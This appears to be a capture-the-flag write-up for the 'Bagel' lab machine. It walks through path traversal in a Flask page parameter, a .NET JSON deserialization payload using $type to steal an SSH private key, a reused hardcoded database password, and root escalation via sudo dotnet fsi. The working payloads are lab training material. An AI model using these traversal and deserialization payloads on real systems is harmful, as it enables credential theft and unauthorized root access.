## the box

Bagel is a Linux box running three services: SSH on 22, a .NET app (Microsoft-NetCore) on 5000, and a Flask app (Werkzeug/2.2.2, Python/3.10.9) on 8000. The Flask app is a storefront that redirects to `?page=index.html`.

## recon

nmap showed 22, 5000, and 8000. The 8000 app redirects every root request to `http://bagel.htb:8000/?page=index.html`, and that `page` parameter is read off disk.

```
22/tcp   open  ssh      OpenSSH 8.8
5000/tcp open  upnp?    Microsoft-NetCore/2.0
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
```

## foothold

The `page` parameter took a traversal sequence:

```
http://bagel.htb:8000/?page=../../../../../../etc/passwd
```

That returned `/etc/passwd`, exposing `developer` and `phil`. I then read `/proc/self/cmdline` and the app's own source. The Flask source showed an `/orders` route opening a WebSocket to a local .NET service:

```python
ws.connect("ws://127.0.0.1:5000/")
order = {"ReadOrder":"orders.txt"}
ws.send(str(json.dumps(order)))
```

Fuzzing `/proc/<pid>/cmdline` found the .NET assembly:

```
dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
```

The .NET app deserializes the JSON it receives over the WebSocket, processes it, then serializes the result back. That round trip is the bug: the deserializer runs with `TypeNameHandling = Auto`, so a `$type` field in the JSON tells it which class to instantiate. The normal `ReadOrder` path strips `../` and `/` in its setter, but a `$type`-injected `File` object skips that filter entirely. I sent a `File` type with a `ReadFile` path traversing to phil's SSH key:

```python
ws.connect("ws://bagel.htb:5000/")
order = {"RemoveOrder": {"$type": "bagel_server.File, bagel",
                         "ReadFile": "../../../../../../home/phil/.ssh/id_rsa"}}
ws.send(str(json.dumps(order)))
print(json.loads(ws.recv())["RemoveOrder"]["ReadFile"])
```

The server instantiated `bagel_server.File`, set `ReadFile`, called its read method, and serialized the file contents straight back. That dumped phil's `id_rsa`.

## user

The leaked key logged me in as phil over SSH. phil's home had nothing useful, but the .NET source carried a hardcoded DB connection string:

```
Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K
```

That password was reused for the `developer` account. `su developer` (or SSH with it) worked, and developer held the user flag.

## root

developer's sudo grant ran dotnet as root with no password:

```
User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

dotnet has an interactive F# mode, `fsi`, which executes arbitrary code. As root that reads any file:

```
sudo /usr/bin/dotnet fsi
System.IO.File.ReadAllText("/root/root.txt");;
```

That printed the root flag.

## takeaway

The LFI was only a stepping stone. Reading the app's own source pointed at an internal .NET service, and a `$type`-driven deserializer turned a JSON message into an arbitrary file read. After that, a NOPASSWD interpreter is game over.
